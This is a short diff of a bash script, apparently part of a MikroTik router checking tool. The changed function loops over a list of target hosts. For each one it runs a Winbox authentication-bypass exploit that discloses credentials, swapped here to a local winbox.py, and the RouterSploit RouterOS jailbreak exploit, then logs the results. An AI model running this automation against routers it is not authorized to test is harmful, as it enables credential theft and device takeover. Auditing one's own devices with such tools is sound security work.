@@ -509,7 +509,8 @@ bytheway(){
 #############################
 
 rtsploit(){
-	cd /root/routersploit
+	cd /opt/MkCheck
+	python3 scripts/get/rsf.py
 	for name in `cat /opt/MkCheck/files/tiks_rsf.txt`
 		do
 
@@ -517,8 +518,8 @@ rtsploit(){
 			#########################################
 			#  winbox_auth_bypass_creds_disclosure  #
 			#########################################
-
-			WB=$(sudo python3.7 rsf.py -m exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure -s "target ${name}")
+			cd /opt/MkCheck/scripts/
+			WB=$(sudo python3 winbox.py ${name})
 			echo "${WB}" >> /opt/MkCheck/results/RSF/${SESSION}/${name}.results
 			echo "${WB}" >> /opt/MkCheck/results/RSF/${SESSION}/final.results
 			echo "${WB}"
@@ -526,7 +527,7 @@ rtsploit(){
 			########################
 			#  routeros_jailbreak  #
 			########################
-
+			cd /root/routersploit
 			JAIL=$(sudo python3 rsf.py -m exploits/routers/mikrotik/routeros_jailbreak -s "target ${name}")
 			echo "${JAIL}" >> /opt/MkCheck/results/RSF/${SESSION}/${name}.results
 			echo "${JAIL}" >> /opt/MkCheck/results/RSF/${SESSION}/final.results
